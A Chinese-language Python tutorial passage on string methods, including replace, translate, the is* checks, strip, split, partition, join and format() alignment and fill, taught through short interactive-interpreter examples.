<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; new_code = code.expandtabs(4)</span><br><span class="line">&gt;&gt;&gt; print(new_code)</span><br><span class="line">    </span><br><span class="line">    print(&quot;I love MoralSec.&quot;)</span><br><span class="line">    print(&quot;I love my wife.&quot;)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p><code>replace(old, new, count=-1)</code> 方法返回一个将所有 old 参数指定的子字符串替换为 new 的新字符串。另外，还有一个 count 参数是指定替换的次数，默认值 -1 表示替换全部。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;在吗！我在你家楼下，快点下来!!&quot;.replace(&quot;在吗&quot;, &quot;想你&quot;)</span><br><span class="line">&#x27;想你！我在你家楼下，快点下来!!&#x27;</span><br></pre></td></tr></table></figure>
<p><code>translate(table)</code> 方法，这个是返回一个根据 table 参数（用于指定一个转换规则的表格）转换后的新字符串。</p>
<p>需要使用 <code>str.maketrans(x[, y[, z]])</code> 方法制定一个包含转换规则的表格。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; table = str.maketrans(&quot;ABCDEFG&quot;, &quot;1234567&quot;)</span><br><span class="line">&gt;&gt;&gt; &quot;YOU ARE AN APPLE OF MY EYE&quot;.translate(table)</span><br><span class="line">&#x27;YOU 1R5 1N 1PPL5 O6 MY 5Y5&#x27;</span><br></pre></td></tr></table></figure>
<p>这个 <code>str.maketrans()</code> 方法还支持第三个参数，表示将其指定的字符串忽略：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;YOU ARE AN APPLE OF MY EYE&quot;.translate(str.maketrans(&quot;ABCDEFG&quot;, &quot;1234567&quot;,&quot;ARE&quot;))</span><br><span class="line">&#x27;YOU  N PPL O6 MY Y&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="10-3-1-判断"><a href="#10-3-1-判断" class="headerlink" title="10.3.1 判断"></a>10.3.1 判断</h3><p><code>startswith(prefix[, start[, end]])</code>  <code>endswith(suffix[, start[, end]])</code>  <code>istitle()</code>  <code>isupper()</code>  <code>islower()</code>  <code>isalpha()</code>  <code>isascii()</code>  <code>isspace()</code>  <code>isprintable()</code>  <code>isdecimal()</code>  <code>isdigit()</code>  <code>isnumeric()</code>  <code>isalnum()</code>  <code>isidentifier()</code></p>
<p>这 14 个方法都是应对各种情况的判断，所以返回的都是一个布尔类型的值 —— 要么是 True，要么是 False。</p>
<p><code>startswith(prefix[, start[, end]])</code> 方法用于判断 <code>prefix</code> 参数指定的子字符串是否出现在字符串的起始位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;我爱Python&quot;</span><br><span class="line">&gt;&gt;&gt; x.startswith(&quot;我&quot;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; x.startswith(&quot;小猫咪&quot;)</span><br><span class="line">False</span><br></pre></td></tr></table></figure>
<p>对应的，<code>endswith(suffix[, start[, end]])</code> 方法则相反，用于判断 suffix 参数指定的子字符串是否出现在字符串的结束位置：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.startswith(&quot;我&quot;, 1)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; x.startswith(&quot;爱&quot;, 1)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; x.endswith(&quot;Py&quot;)</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; x.endswith(&quot;Py&quot;, 0, 4)</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<p>这个 <code>prefix</code> 和 <code>suffix</code> 参数，其实是支持以元组的形式传入多个待匹配的字符串的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;她爱Pyhon&quot;</span><br><span class="line">&gt;&gt;&gt; if x.startswith((&quot;你&quot;, &quot;我&quot;, &quot;她&quot;)):</span><br><span class="line">...     print(&quot;总有人喜爱Pyhon&quot;)</span><br><span class="line">...</span><br><span class="line">总有人喜爱Pyhon</span><br></pre></td></tr></table></figure><br>如果你希望判断一个字符串中的所有单词是否都是以大写字母开头，其余字母均为小写，那么可以使用 istitle() 方法进行测试：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;I Love Python&quot;</span><br><span class="line">&gt;&gt;&gt; x.istitle()</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>如果你希望判断一个字符串中所有字母是否都是大写，可以使用 isupper() 方法进行测试<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.isupper()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; x.upper().isupper()</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>相反，判断是否所有字母都是小写，用 islower() 方法，我们这里就不再赘述了。</p>
<p>如果你希望判断一个字符串中是否只是由字母组成，可以使用 isalpha() 方法进行检测：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.isalpha()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; &quot;IlovePython&quot;.isalpha()</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>如果你希望判断一个字符串中是否只是由 ASCII 字符组成，可以使用 isascii() 方法进行检测：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.isascii()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &quot;我爱Pyhon&quot;.isascii()</span><br><span class="line">False</span><br></pre></td></tr></table></figure><br>如果你希望判断是否为一个空白字符串，可以用 isspace() 方法进行检测：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;    \t\n&quot;.isspace()</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>如果你希望判断一个字符串中是否所有字符都是可打印的，可以使用 isprintable() 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x.isprintable()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &quot;I love FishC\n&quot;.isprintable()</span><br><span class="line">False</span><br></pre></td></tr></table></figure></p>
<p>isdecimal()、isdigit() 和 isnumeric() 三个方法都是用来判断数字的。</p>
<p>首先是十进制数字：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;12345&quot;</span><br><span class="line">&gt;&gt;&gt; x.isdecimal()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; x.isdigit()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; x.isnumeric()</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>如果写成罗马数字：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;ⅠⅡⅢⅣⅤ&quot;</span><br><span class="line">&gt;&gt;&gt; x.isdecimal()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; x.isdigit()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; x.isnumeric()</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>或者中文数字：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;一二三四五&quot;</span><br><span class="line">&gt;&gt;&gt; x.isdecimal()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; x.isdigit()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; x.isnumeric()</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>isdecimal() 和 isdigit() 方法都败下阵来了，但 isnumeric() 方法，其实连繁体数字也难不倒它地：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = &quot;壹贰叁肆伍&quot;</span><br><span class="line">&gt;&gt;&gt; x.isdecimal()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; x.isdigit()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; x.isnumeric()</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>isalnum() 方法则是集大成者，只要 isalpha()、isdecimal()、isdigit() 或者 isnumeric() 任意一个方法返回 True，结果都为 True。</p>
<p>最后，isidentifier() 方法用于判断该字符串是否一个合法的 Python 标识符<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;I a good gay&quot;.isidentifier()</span><br><span class="line">False</span><br><span class="line">&gt;&gt;&gt; &quot;I_a_good_gay&quot;.isidentifier()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &quot;FishC520&quot;.isidentifier()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &quot;520FishC&quot;.isidentifier()</span><br><span class="line">False</span><br></pre></td></tr></table></figure></p>
<p>如果你想判断一个字符串是否为 Python 的保留标识符，就是像 “if”、“for”、“while” 这些关键字的话，可以使用 keyword 模块的 iskeyword() 函数来实现：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import keyword</span><br><span class="line">&gt;&gt;&gt; keyword.iskeyword(&quot;if&quot;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; keyword.iskeyword(&quot;py&quot;)</span><br><span class="line">False</span><br></pre></td></tr></table></figure></p>
<h3 id="10-4-1-截取"><a href="#10-4-1-截取" class="headerlink" title="10.4.1 截取"></a>10.4.1 截取</h3><p><code>lstrip(chars=None)</code>、<code>rstrip(chars=None)</code>、<code>strip(chars=None)</code>、<code>removeprefix(prefix)</code>、<code>removesuffix(suffix)</code></p>
<p>这几个方法都是用来截取字符串的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;    左侧不要留白&quot;.lstrip()</span><br><span class="line">&#x27;左侧不要留白&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;右侧不要留白    &quot;.rstrip()</span><br><span class="line">&#x27;右侧不要留白&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;    左右不要留白    &quot;.strip()</span><br><span class="line">&#x27;左右不要留白&#x27;</span><br></pre></td></tr></table></figure></p>
<p>例题：如果要从字符串 “<a target="_blank" rel="noopener" href="https://ilovefishc.com/html5/index.html">https://ilovefishc.com/html5/index.html</a>“ 中提取出 “ilovefishc.com”，使用 split() 方法应该如何实现呢？<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;https://ilovefishc.com/html5/index.html&quot;.split(&#x27;//&#x27;)[1].split(&#x27;/&#x27;)[0]</span><br><span class="line">&#x27;ilovefishc.com&#x27;</span><br></pre></td></tr></table></figure><br>解析：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;https://ilovefishc.com/html5/index.html&quot;.split(&#x27;//&#x27;)</span><br><span class="line">[&#x27;https:&#x27;, &#x27;ilovefishc.com/html5/index.html&#x27;]</span><br><span class="line">&gt;&gt;&gt; &quot;https://ilovefishc.com/html5/index.html&quot;.split(&#x27;//&#x27;)[1]            #[1]为返回列表的索引</span><br><span class="line">&#x27;ilovefishc.com/html5/index.html&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;https://ilovefishc.com/html5/index.html&quot;.split(&#x27;//&#x27;)[1].split(&#x27;/&#x27;)</span><br><span class="line">[&#x27;ilovefishc.com&#x27;, &#x27;html5&#x27;, &#x27;index.html&#x27;]</span><br><span class="line">&gt;&gt;&gt; &quot;https://ilovefishc.com/html5/index.html&quot;.split(&#x27;//&#x27;)[1].split(&#x27;/&#x27;)[0]</span><br><span class="line">&#x27;ilovefishc.com&#x27;</span><br></pre></td></tr></table></figure></p>
<p>这三个方法都有一个 chars=None 的参数， None 在 Python 中表示没有，意思就是去除的是空白。<br>那么这个参数其实是可以给它传入一个字符串的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;www.github.com&quot;.lstrip(&quot;wcom.&quot;)</span><br><span class="line">&#x27;github.com&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;www.github.com&quot;.rstrip(&quot;wcom.&quot;)</span><br><span class="line">&#x27;www.github&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;www.github.com&quot;.strip(&quot;wcom.&quot;)</span><br><span class="line">&#x27;github&#x27;</span><br></pre></td></tr></table></figure></p>
<p><code>removeprefix(prefix)</code> 和 <code>removesuffix(suffix)</code> 这两个方法,它们允许你指定将要删除的前缀或后缀：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;www.github.com&quot;.removeprefix(&quot;www.&quot;)</span><br><span class="line">&#x27;github.com&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;www.github.com&quot;.removesuffix(&quot;.com&quot;)</span><br><span class="line">&#x27;www.github&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="10-4-2-拆分"><a href="#10-4-2-拆分" class="headerlink" title="10.4.2 拆分"></a>10.4.2 拆分</h3><p><code>partition(sep)</code>、<code>rpartition(sep)</code>、<code>split(sep=None, maxsplit=-1)</code>、<code>rsplit(sep=None, maxsplit=-1)</code>、<code>splitlines(keepends=False)</code></p>
<p>拆分字符串，言下之意就是把字符串给大卸八块，比如 partition(sep) 和 rpartition(sep) 方法，就是将字符串以 sep 参数指定的分隔符为依据进行切割，返回的结果是一个 3 元组（3 个元素的元组）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;www.github.com&quot;.partition(&quot;.&quot;)</span><br><span class="line">(&#x27;www&#x27;, &#x27;.&#x27;, &#x27;github.com&#x27;)</span><br></pre></td></tr></table></figure></p>
<p><code>partition(sep)</code> 和 <code>rpartition(sep)</code> 方法的区别是前者是从左往右找分隔符，后者是从右往左找分隔符：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;github.com/python&quot;.partition(&quot;/&quot;)</span><br><span class="line">(&#x27;github.com&#x27;, &#x27;/&#x27;, &#x27;python&#x27;)</span><br></pre></td></tr></table></figure><br><strong>注意：它俩如果找不到分隔符，返回的仍然是一个 3 元组，只不过将原字符串放在第一个元素，其它两个元素为空字符串。</strong></p>
<p><code>split(sep=None, maxsplit=-1)</code> 和 <code>rsplit(sep=None, maxsplit=-1)</code> 方法则是可以将字符串切成一块块：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;苟日新，日日新，又日新&quot;.split(&quot;，&quot;)</span><br><span class="line">[&#x27;苟日新&#x27;, &#x27;日日新&#x27;, &#x27;又日新&#x27;]</span><br><span class="line">&gt;&gt;&gt; &quot;苟日新，日日新，又日新&quot;.rsplit(&quot;，&quot;)</span><br><span class="line">[&#x27;苟日新&#x27;, &#x27;日日新&#x27;, &#x27;又日新&#x27;]</span><br><span class="line">&gt;&gt;&gt; &quot;苟日新，日日新，又日新&quot;.split(&quot;，&quot;, 1)</span><br><span class="line">[&#x27;苟日新&#x27;, &#x27;日日新，又日新&#x27;]</span><br><span class="line">&gt;&gt;&gt; &quot;苟日新，日日新，又日新&quot;.rsplit(&quot;，&quot;, 1)</span><br><span class="line">[&#x27;苟日新，日日新&#x27;, &#x27;又日新&#x27;]</span><br></pre></td></tr></table></figure></p>
<p><code>splitlines(keepends=False)</code> 方法会将字符串进行按行分割，并将结果以列表的形式返回<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;苟日新\n日日新\n又日新&quot;.splitlines()</span><br><span class="line">[&#x27;苟日新&#x27;, &#x27;日日新&#x27;, &#x27;又日新&#x27;]</span><br><span class="line">&gt;&gt;&gt; &quot;苟日新\r日日新\r又日新&quot;.splitlines()</span><br><span class="line">[&#x27;苟日新&#x27;, &#x27;日日新&#x27;, &#x27;又日新&#x27;]</span><br><span class="line">&gt;&gt;&gt; &quot;苟日新\r日日新\r\n又日新&quot;.splitlines()</span><br><span class="line">[&#x27;苟日新&#x27;, &#x27;日日新&#x27;, &#x27;又日新&#x27;]</span><br></pre></td></tr></table></figure></p>
<p><code>keepends</code> 参数用于指定结果是否包含换行符，True 是包含，默认 False 则表示是不包含：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;苟日新\r日日新\r\n又日新&quot;.splitlines(True)</span><br><span class="line">[&#x27;苟日新\r&#x27;, &#x27;日日新\r\n&#x27;, &#x27;又日新&#x27;]</span><br></pre></td></tr></table></figure></p>
<h3 id="10-4-3-拼接"><a href="#10-4-3-拼接" class="headerlink" title="10.4.3 拼接"></a>10.4.3 拼接</h3><p><code>join(iterable)</code> 方法是用于实现字符串拼接的。</p>
<p>虽然的它的用法在初学者看来是非常难受的，但是在实际开发中，它却常常是受到大神追捧的一个方法。</p>
<p>字符串是作为分隔符使用，然后 <code>iterable</code> 参数指定插入的子字符串：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;.&quot;.join([&quot;www&quot;, &quot;ilovefishc&quot;, &quot;com&quot;])</span><br><span class="line">&#x27;www.ilovefishc.com&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;^&quot;.join((&quot;F&quot;, &quot;ish&quot;, &#x27;C&#x27;))</span><br><span class="line">&#x27;F^ish^C&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;&quot;.join((&quot;FishC&quot;, &quot;FishC&quot;))</span><br><span class="line">&#x27;FishCFishC&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="10-5-1-格式化字符串"><a href="#10-5-1-格式化字符串" class="headerlink" title="10.5.1 格式化字符串"></a>10.5.1 格式化字符串</h3><p>在字符串中，格式化字符串的套路就是使用一对花括号（{}）来表示替换字段，就在原字符串中先占一个坑的意思，然后真正的内容被放在了 format() 方法的参数中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; year = 2010</span><br><span class="line">&gt;&gt;&gt; &quot;鱼C工作室成立于 year 年。&quot;</span><br><span class="line">&#x27;鱼C工作室成立于 year 年。&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;鱼C工作室成立于 &#123;&#125; 年。&quot;.format(year)</span><br><span class="line">&#x27;鱼C工作室成立于 2010 年。&#x27;</span><br></pre></td></tr></table></figure>
<p>又比如：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;1+2=&#123;&#125;, 2的平方是&#123;&#125;，3的立方是&#123;&#125;&quot;.format(1+2, 2*2, 3*3*3)</span><br><span class="line">&#x27;1+2=3, 2的平方是4，3的立方是27&#x27;</span><br></pre></td></tr></table></figure></p>
<p>在花括号里面，可以写上数字，表示参数的位置：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&#123;1&#125;看到&#123;0&#125;就很激动！&quot;.format(&quot;mortal&quot;, &quot;漂亮的小姐姐&quot;)</span><br><span class="line">&#x27;漂亮的小姐姐看到mortal就很激动！&#x27;</span><br></pre></td></tr></table></figure></p>
<p>注意，同一个索引值是可以被多次引用的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&#123;0&#125;&#123;0&#125;&#123;1&#125;&#123;1&#125;&quot;.format(&quot;是&quot;, &quot;非&quot;)</span><br><span class="line">&#x27;是是非非&#x27;</span><br></pre></td></tr></table></figure></p>
<p>还可以通过关键字进行索引，比如：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;我叫&#123;name&#125;，我爱&#123;fav&#125;。&quot;.format(name=&quot;mortal&quot;, fav=&quot;Pyhon&quot;)</span><br><span class="line">&#x27;我叫mortal，我爱Pyhon。&#x27;</span><br></pre></td></tr></table></figure></p>
<p>当然，位置索引和关键字索引可以组合使用：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;我叫&#123;name&#125;，我爱&#123;0&#125;。喜爱&#123;0&#125;的人，运气都不会太差^o^&quot;.format(&quot;python&quot;, name=&quot;mortal&quot;)</span><br><span class="line">&#x27;我叫mortal，我爱python。喜爱python的人，运气都不会太差^o^&#x27;</span><br></pre></td></tr></table></figure></p>
<p>如果我只是想单纯的输出一个纯洁的花括号，那应该怎么办呢？<br>有两种办法可以把这个纯洁的花括号安排进去：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&#123;&#125;, &#123;&#125;, &#123;&#125;&quot;.format(1, &quot;&#123;&#125;&quot;, 2)</span><br><span class="line">&#x27;1, &#123;&#125;, 2&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;&#123;&#125;, &#123;&#123;&#125;&#125;, &#123;&#125;&quot;.format(1, 2)</span><br><span class="line">&#x27;1, &#123;&#125;, 2&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="10-5-2-字符串格式化语法参考"><a href="#10-5-2-字符串格式化语法参考" class="headerlink" title="10.5.2 字符串格式化语法参考"></a>10.5.2 字符串格式化语法参考</h3><p>以下所解锁的新知识，可以直接在字符串的 format() 方法上使用，也可以用于 Python3.6 后新添加的<strong>f-字符串</strong>。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">format_spec     ::=  [[fill]align][sign][#][0][width][grouping_option][.precision][type]</span><br><span class="line">fill            ::=  &lt;any character&gt;</span><br><span class="line">align           ::=  &quot;&lt;&quot; | &quot;&gt;&quot; | &quot;=&quot; | &quot;^&quot;</span><br><span class="line">sign            ::=  &quot;+&quot; | &quot;-&quot; | &quot; &quot;</span><br><span class="line">width           ::=  digit+</span><br><span class="line">grouping_option ::=  &quot;_&quot; | &quot;,&quot;</span><br><span class="line">precision       ::=  digit+</span><br><span class="line">type            ::=  &quot;b&quot; | &quot;c&quot; | &quot;d&quot; | &quot;e&quot; | &quot;E&quot; | &quot;f&quot; | &quot;F&quot; | &quot;g&quot; | &quot;G&quot; | &quot;n&quot; | &quot;o&quot; | &quot;s&quot; | &quot;x&quot; | &quot;X&quot; | &quot;%&quot;</span><br></pre></td></tr></table></figure></p>
<p><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-185807-1-1.html">https://fishc.com.cn/thread-185807-1-1.html</a> <a href="&quot;https://fishc.com.cn/thread-185807-1-1.html&quot;">字符串格式化语法参考</a></p>
<h4 id="10-5-2-1-对齐选项（-align-）"><a href="#10-5-2-1-对齐选项（-align-）" class="headerlink" title="10.5.2.1 对齐选项（[align]）"></a>10.5.2.1 对齐选项（[align]）</h4><p><img src="/image/字符串对齐.png" alt="对齐选项"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&#123;:^&#125;&quot;.format(250)</span><br><span class="line">&#x27;250&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;&#123;:^10&#125;&quot;.format(250)</span><br><span class="line">&#x27;   250    &#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;&#123;1:&gt;10&#125;&#123;0:&lt;10&#125;&quot;.format(520, 250)</span><br><span class="line">&#x27;       250520       &#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;&#123;left:&gt;10&#125;&#123;right:&lt;10&#125;&quot;.format(right=520, left=250)</span><br><span class="line">&#x27;       250520       &#x27;</span><br></pre></td></tr></table></figure>
<p><code>&quot;&#123;1:&gt;10&#125;&#123;0:&lt;10&#125;&quot;.format(520, 250)</code>  1 ~ 位置索引  &gt; ~ 对齐方向  10 ~ 显示宽度</p>
<h4 id="10-5-2-2-填充选项（-fill-）"><a href="#10-5-2-2-填充选项（-fill-）" class="headerlink" title="10.5.2.2 填充选项（[fill]）"></a>10.5.2.2 填充选项（[fill]）</h4><p>在指定宽度的前面还可以添加一个 ‘0’，则表示为数字类型启用感知正负号的 ‘0’ 填充效果：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;&#123;:010&#125;&quot;.format(520)</span><br><span class="line">&#x27;0000000520&#x27;</span><br><span class="line">&gt;&gt;&gt; &quot;&#123;:010&#125;&quot;.format(-520)</span><br><span class="line">&#x27;-000000520&#x27;</span><br></pre></td></tr></table></figure></p>
